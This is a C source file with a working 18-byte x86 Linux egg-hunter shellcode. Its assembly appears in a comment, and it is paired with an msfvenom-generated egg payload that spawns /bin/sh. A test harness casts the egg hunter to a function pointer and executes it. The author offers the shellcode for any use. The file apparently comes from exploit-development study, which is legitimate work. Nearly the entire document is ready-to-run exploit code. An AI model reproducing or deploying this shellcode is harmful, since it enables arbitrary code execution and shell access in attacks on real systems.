// Description: a 18 bytes egg hunter on contigous memory segments
//
// You are free to do whatever you want of this shellcode
//
// @phackt_ul
/*
global  _start

section .text
_start:

	mov eax, _start				; we set a valid .text address into eax
	mov ebx, dword 0x50905091	; we can avoid an 8 bytes tag in egg if the tag
    dec ebx						; can not be found in the egg hunter, that's why we decrement to look for
    							; 0x50905090 - push eax, nop, push eax, nop

next_addr:

	inc eax
    cmp dword [eax], ebx		; do we found the tag ?
    jne next_addr
    jmp eax						; yes we do so we jump to the egg
*/
#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = \
"\xb8\x60\x80\x04\x08\xbb\x91\x50\x90\x50\x4b\x40\x39\x18\x75\xfb\xff\xe0";

unsigned char egg[] = \
"\x90\x50\x90\x50" // egg mark - do not remove
"\xbd\x64\xb2\x0c\xf4\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1" // msfvenom -p linux/x86/exec CMD=/bin/sh -f c -b \x00
"\x0b\x83\xc2\x04\x31\x6a\x11\x03\x6a\x11\xe2\x91\xd8\x07\xac"
"\xc0\x4f\x7e\x24\xdf\x0c\xf7\x53\x77\xfc\x74\xf4\x87\x6a\x54"
"\x66\xee\x04\x23\x85\xa2\x30\x3b\x4a\x42\xc1\x13\x28\x2b\xaf"
"\x44\xdf\xc3\x2f\xcc\x4c\x9a\xd1\x3f\xf2";

void main()
{

	printf("Egg hunter shellcode Length:  %d\n", strlen(egghunter));
	printf("Egg shellcode Length:  %d\n", strlen(egg));

	int (*ret)() = (int(*)())egghunter;

	ret();

}